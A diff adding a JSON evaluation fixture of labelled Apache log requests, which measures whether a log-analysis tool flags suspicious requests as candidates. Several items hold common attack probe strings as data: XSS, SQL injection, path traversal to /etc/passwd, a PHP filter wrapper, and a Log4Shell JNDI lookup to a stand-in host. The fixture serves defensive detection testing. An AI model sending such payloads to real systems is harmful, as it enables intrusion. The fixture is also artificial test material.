@@ -1,0 +1,331 @@
+{
+  "schema_version": "prepare_candidate_selection_eval.v1",
+  "description": "Minimal Apache logs-only labels for prepare candidate selection. Labels measure whether prepare is expected to include a request as an analysis candidate; they do not label exploit success or benignness.",
+  "label_policy": {
+    "candidate_expected": "Human expects prepare to include this request as a candidate.",
+    "candidate_not_expected": "Human does not expect this request to be included as a candidate.",
+    "unsure": "Insufficient or ambiguous Apache log evidence for evaluation."
+  },
+  "guardrails": [
+    "candidate_expected_does_not_mean_attack_success",
+    "candidate_not_expected_does_not_mean_benign",
+    "apache_logs_only_no_success_inference",
+    "status_code_response_size_route_or_user_agent_do_not_prove_success_or_benign"
+  ],
+  "reason_taxonomy": [
+    "xss_probe",
+    "sqli_probe",
+    "path_traversal_probe",
+    "sensitive_path_probe",
+    "auth_behavior_signal",
+    "protocol_anomaly_signal",
+    "static_asset_like",
+    "crawler_or_baseline_like",
+    "low_signal_request",
+    "duplicate_low_signal",
+    "insufficient_log_evidence",
+    "unsure"
+  ],
+  "items": [
+    {
+      "request_id": "eval_req_001",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/search.php?q=%3Cscript%3Ealert(1)%3C/script%3E",
+      "status_code": 200,
+      "human_label": "candidate_expected",
+      "reason": "xss_probe",
+      "notes": "Probe-like request target; does not imply browser execution or exploit success."
+    },
+    {
+      "request_id": "eval_req_002",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/search?q=' OR 1=1--",
+      "status_code": 403,
+      "human_label": "candidate_expected",
+      "reason": "sqli_probe",
+      "notes": "SQLi-like query string; status code is not used as success evidence."
+    },
+    {
+      "request_id": "eval_req_003",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/view?file=../../etc/passwd",
+      "status_code": 200,
+      "human_label": "candidate_expected",
+      "reason": "path_traversal_probe",
+      "notes": "Traversal-like request target; response metadata does not prove file disclosure."
+    },
+    {
+      "request_id": "eval_req_004",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/.env",
+      "status_code": 404,
+      "human_label": "candidate_expected",
+      "reason": "sensitive_path_probe",
+      "notes": "Sensitive path probing signal; status code does not prove exposure or safety."
+    },
+    {
+      "request_id": "eval_req_005",
+      "source": "minimal_manual_fixture",
+      "method": "POST",
+      "uri": "/login",
+      "status_code": 401,
+      "human_label": "candidate_expected",
+      "reason": "auth_behavior_signal",
+      "notes": "Repeated auth-like signal in a labeled fixture; not account takeover evidence."
+    },
+    {
+      "request_id": "eval_req_006",
+      "source": "minimal_manual_fixture",
+      "method": "PRI",
+      "uri": "*",
+      "status_code": 400,
+      "human_label": "candidate_expected",
+      "reason": "protocol_anomaly_signal",
+      "notes": "Protocol anomaly signal from request line."
+    },
+    {
+      "request_id": "eval_req_007",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/admin/config.php",
+      "status_code": 403,
+      "human_label": "candidate_expected",
+      "reason": "sensitive_path_probe",
+      "notes": "Administrative config path probe."
+    },
+    {
+      "request_id": "eval_req_008",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/api/items?id=1%20UNION%20SELECT%201,2",
+      "status_code": 500,
+      "human_label": "candidate_expected",
+      "reason": "sqli_probe",
+      "notes": "SQLi-like payload in query target; error status is supporting metadata only."
+    },
+    {
+      "request_id": "eval_req_009",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/index.php?page=php://filter/convert.base64-encode/resource=index.php",
+      "status_code": 200,
+      "human_label": "candidate_expected",
+      "reason": "path_traversal_probe",
+      "notes": "PHP wrapper-style file read probe; no disclosure inference."
+    },
+    {
+      "request_id": "eval_req_010",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/server-status",
+      "status_code": 403,
+      "human_label": "candidate_expected",
+      "reason": "sensitive_path_probe",
+      "notes": "Sensitive Apache status path probe."
+    },
+    {
+      "request_id": "eval_req_011",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/?q=${jndi:ldap://example.invalid/a}",
+      "status_code": 400,
+      "human_label": "candidate_expected",
+      "reason": "protocol_anomaly_signal",
+      "notes": "Log4Shell-like token in request target; no out-of-band callback inference."
+    },
+    {
+      "request_id": "eval_req_012",
+      "source": "minimal_manual_fixture",
+      "method": "POST",
+      "uri": "/graphql",
+      "status_code": 200,
+      "human_label": "candidate_expected",
+      "reason": "sensitive_path_probe",
+      "notes": "GraphQL introspection-like fixture row; response code does not prove data exposure."
+    },
+    {
+      "request_id": "eval_req_013",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/redirect?next=http://example.invalid/",
+      "status_code": 302,
+      "human_label": "candidate_expected",
+      "reason": "protocol_anomaly_signal",
+      "notes": "External redirect target signal; no browser-follow inference."
+    },
+    {
+      "request_id": "eval_req_014",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/download?name=..%2F..%2Fwindows%2Fwin.ini",
+      "status_code": 404,
+      "human_label": "candidate_expected",
+      "reason": "path_traversal_probe",
+      "notes": "Encoded traversal-like request target."
+    },
+    {
+      "request_id": "eval_req_015",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/static/app.js",
+      "status_code": 200,
+      "human_label": "candidate_not_expected",
+      "reason": "static_asset_like",
+      "notes": "Static asset-like request; candidate exclusion would not prove harmlessness."
+    },
+    {
+      "request_id": "eval_req_016",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/assets/logo.png",
+      "status_code": 200,
+      "human_label": "candidate_not_expected",
+      "reason": "static_asset_like",
+      "notes": "Static image-like request."
+    },
+    {
+      "request_id": "eval_req_017",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/favicon.ico",
+      "status_code": 404,
+      "human_label": "candidate_not_expected",
+      "reason": "static_asset_like",
+      "notes": "Common icon request; 404 is not used as safety evidence."
+    },
+    {
+      "request_id": "eval_req_018",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/robots.txt",
+      "status_code": 200,
+      "human_label": "candidate_not_expected",
+      "reason": "crawler_or_baseline_like",
+      "notes": "Crawler/baseline-like request."
+    },
+    {
+      "request_id": "eval_req_019",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/",
+      "status_code": 200,
+      "human_label": "candidate_not_expected",
+      "reason": "low_signal_request",
+      "notes": "Low-signal root request in this fixture."
+    },
+    {
+      "request_id": "eval_req_020",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/health",
+      "status_code": 200,
+      "human_label": "candidate_not_expected",
+      "reason": "low_signal_request",
+      "notes": "Health-like endpoint in this fixture."
+    },
+    {
+      "request_id": "eval_req_021",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/static/app.js",
+      "status_code": 304,
+      "human_label": "candidate_not_expected",
+      "reason": "duplicate_low_signal",
+      "notes": "Repeated static asset-like request."
+    },
+    {
+      "request_id": "eval_req_022",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/css/site.css",
+      "status_code": 200,
+      "human_label": "candidate_not_expected",
+      "reason": "static_asset_like",
+      "notes": "Stylesheet asset-like request."
+    },
+    {
+      "request_id": "eval_req_023",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/images/banner.webp",
+      "status_code": 200,
+      "human_label": "candidate_not_expected",
+      "reason": "static_asset_like",
+      "notes": "Image asset-like request."
+    },
+    {
+      "request_id": "eval_req_024",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/feed",
+      "status_code": 200,
+      "human_label": "candidate_not_expected",
+      "reason": "crawler_or_baseline_like",
+      "notes": "Feed-like crawler/baseline request."
+    },
+    {
+      "request_id": "eval_req_025",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/search?q=shoes",
+      "status_code": 200,
+      "human_label": "candidate_not_expected",
+      "reason": "low_signal_request",
+      "notes": "Plain search fixture row without probe-like tokens; not a benignness label."
+    },
+    {
+      "request_id": "eval_req_026",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/about",
+      "status_code": 200,
+      "human_label": "candidate_not_expected",
+      "reason": "low_signal_request",
+      "notes": "Low-signal content page request in this fixture."
+    },
+    {
+      "request_id": "eval_req_027",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/search?q=%26lt%3Bscript%26gt%3B",
+      "status_code": 200,
+      "human_label": "unsure",
+      "reason": "unsure",
+      "notes": "Ambiguous encoded text pattern in this fixture; excluded from metrics."
+    },
+    {
+      "request_id": "eval_req_028",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/download?file=report",
+      "status_code": 200,
+      "human_label": "unsure",
+      "reason": "insufficient_log_evidence",
+      "notes": "Insufficient Apache log evidence for candidate expectation."
+    },
+    {
+      "request_id": "eval_req_029",
+      "source": "minimal_manual_fixture",
+      "method": "POST",
+      "uri": "/login",
+      "status_code": 200,
+      "human_label": "unsure",
+      "reason": "insufficient_log_evidence",
+      "notes": "A single auth row without surrounding pattern is ambiguous for this evaluation."
+    },
+    {
+      "request_id": "eval_req_030",
+      "source": "minimal_manual_fixture",
+      "method": "GET",
+      "uri": "/api/profile?id=123",
+      "status_code": 200,
+      "human_label": "unsure",
+      "reason": "unsure",
+      "notes": "Low-detail API request excluded from metric calculation."
+    }
+  ]
+}
